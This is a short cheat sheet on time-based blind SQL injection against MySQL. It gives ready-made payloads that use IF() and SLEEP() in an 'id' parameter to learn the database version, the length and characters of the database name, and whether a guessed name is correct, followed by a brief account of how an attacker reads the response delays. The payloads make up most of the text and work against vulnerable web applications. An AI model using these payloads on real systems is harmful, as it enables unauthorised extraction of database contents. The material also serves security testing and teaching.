### Time Delay Injection (SLEEP) to Detect Vulnerability

**Inject a SLEEP command to delay response:**

```sql
id=1' AND (select sleep(10)) --+

```

**Conditional sleep based on MySQL version:**

```sql
id=1' AND (select if((select version()) like '8%', sleep(10), null)) --+

```

**Conditional sleep based on current database name length:**

```sql
id=1' AND (select if((select length(database())) = 6, sleep(10), null)) --+
id=1' AND (select if((select length(database())) = 9, sleep(10), null)) --+

```

**Conditional sleep based on the first character of the database name:**

```sql
id=1' AND (select if(substr(database(),1,1) = 'a', sleep(10), null)) --+
id=1' AND (select if(substr(database(),1,1) = 'b', sleep(10), null)) --+

```

**Conditional sleep checking if full database name matches:**

```sql
id=1' AND (select if((select database()) = "sqli_db", sleep(10), null)) --+
id=1' AND (select if((select database()) = 'armour_db1', sleep(10), null)) --+
```

### Explanation of Attack Technique

- These payloads leverage the SQL **IF()** function combined with **SLEEP()** to cause delays only when a condition is true.
- The attacker sends these requests and measures the time taken for responses.

## How This Attack Works

1. The attacker injects these payloads into vulnerable inputs.
2. The SQL server delays the response if the condition is true.
3. By measuring the response is delayed, the attacker infers information:
    - **Database version**
    - **Database name**
    - **Existence of certain values or structures**
